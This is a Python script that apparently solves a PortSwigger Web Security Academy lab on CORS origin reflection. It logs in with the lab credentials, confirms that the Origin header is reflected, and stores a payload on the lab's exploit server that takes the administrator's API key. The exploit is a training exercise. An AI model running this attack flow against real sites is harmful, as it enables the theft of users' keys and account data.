from requests import Session
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from os import path
from urllib3 import disable_warnings, exceptions


def lab(url, exploit_server):
    session = Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"})
    session.verify = False
    session.stream = False

    username_encoded = 'wiener'
    password_encoded = 'peter'
    csrf = 'CuDq9mQKi0PrEJ8OzB9lOtPvrKu9yeeg'
    data = f'csrf={csrf}&username={username_encoded}&password={password_encoded}'
    cookies = {"session": "w3DWlfkJtxiwvZev0Uc5w3HI6I0ndTCo"}

    response = session.post(url=f'{url}/login', data=data, cookies=cookies, allow_redirects=False)

    if response.status_code != 302:
        return

    headers = {
        'Origin': 'https://www.google.com'
    }
    response = session.get(url=f'{url}/accountDetails', data=data, headers=headers, allow_redirects=False)
    print("RESPONSE HEADERS")
    response_headers = response.headers
    print(response_headers)
    print("RESPONSE BODY")
    print(response.json())

    if 'https://www.google.com' not in response_headers.get('access-control-allow-origin'):
        print("ORIGIN REFLECTION NOT FOUND")
        return

    with open(path.join(path.dirname(__file__), 'payload.txt')) as lines:
        file = ''
        head = ''
        body = ''
        for line in lines:
            if '§file' in line:
                is_file_payload = True
                is_head_payload = False
                is_body_payload = False
            if '§head' in line:
                is_file_payload = False
                is_head_payload = True
                is_body_payload = False
            if '§body' in line:
                is_file_payload = False
                is_head_payload = False
                is_body_payload = True

            if is_file_payload:
                file += line
            if is_head_payload:
                head += line
            if is_body_payload:
                body += line

            file = file.replace('§file\n', '')
            head = head.replace('§head\n', '')
            body = body.replace('§body\n', '')

        action = 'STORE'
        session.post(
            url=f'{exploit_server}/',
            data=f'urlIsHttps=on&responseFile={file}&responseHead={head}&responseBody={body}&formAction={action}',
            allow_redirects=False
        )

    print(
        f'Open exploit server then click "Deliver exploit to victim",'
        f' see the apikey from the administrator user in \n'
        f'{exploit_server}/log'
    )

    options = Options()
    options.add_argument('-no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--start-maximized')
    options.add_experimental_option('detach', True)
    driver = webdriver.Chrome(options=options)
    driver.get(f'{exploit_server}')


# CORS vulnerability with basic origin reflection
# https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack
if __name__ == '__main__':
    disable_warnings(exceptions.InsecureRequestWarning)

    lab(
        'https://0ae300b9043c079881737a03008800c0.web-security-academy.net',
        'https://exploit-0a7c00ee046807a181f279aa0148007f.exploit-server.net'
    )
